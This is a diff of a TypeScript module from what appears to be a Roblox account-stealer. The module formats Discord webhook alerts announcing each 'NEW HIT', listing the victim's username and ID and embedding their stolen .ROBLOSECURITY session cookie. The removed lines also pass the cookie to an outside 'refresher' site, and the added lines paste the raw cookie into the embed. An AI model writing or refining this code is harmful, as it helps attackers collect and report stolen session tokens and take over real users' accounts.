@@ -1,49 +1,32 @@
-export interface DiscordPayloadOptions {
-  sequenceId: number;
+import { SessionResponse } from "./actions/session";
+
+export interface DiscordPayloadOptions extends SessionResponse {
   gameName: string;
-  cookieValue: string;
   username: string;
-  userId: string;
 }
 
 export function createDiscordPayload({
-  sequenceId,
   gameName,
-  cookieValue,
   username,
+  cookie,
   userId,
+  id,
 }: DiscordPayloadOptions) {
-  const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;
-
   return {
-    content: `@everyone NEW HIT #${sequenceId}`,
+    content: `@everyone NEW HIT #${id}`,
+    attachments: [],
     embeds: [
       {
-        title: `${gameName} | Hit #${sequenceId}`,
-        color: 16711680,
-        description: `**Sequence:** #${sequenceId}\n**Game:** ${gameName}\n**Target Username:** ${username}\n**Target ID:** ${userId}`,
+        title: `${gameName} | Hit #${id}`,
+        color: 0x008ff1,
+        description: `**Sequence:** #${id}\n**Game:** ${gameName}\n**Target Username:** ${username}\n**Target ID:** ${userId}`,
         fields: [
           {
-            name: "🔧 Tool Used",
-            value: "```toolbox                                      ```",
+            name: "🍪 Cookie",
+            value: `\`\`\`${cookie}\`\`\``,
             inline: false,
           },
         ],
-        footer: {
-          text: "Refreshed Cookie | Original Cookie",
-          icon_url: "https://i.imgur.com/0ZxT2S6.png",
-        },
-        timestamp: new Date().toISOString(),
-      },
-      {
-        title: ".ROBLOSECURITY (Refreshed)",
-        color: 16711680,
-        description: `**Links:**\n[Refreshed Cookie](${linkRe})\n\n\`\`\`${cookieValue}\`\`\``,
-        author: {
-          name: "Refreshed Cookie",
-          icon_url:
-            "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
-        },
         timestamp: new Date().toISOString(),
         thumbnail: {
           url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
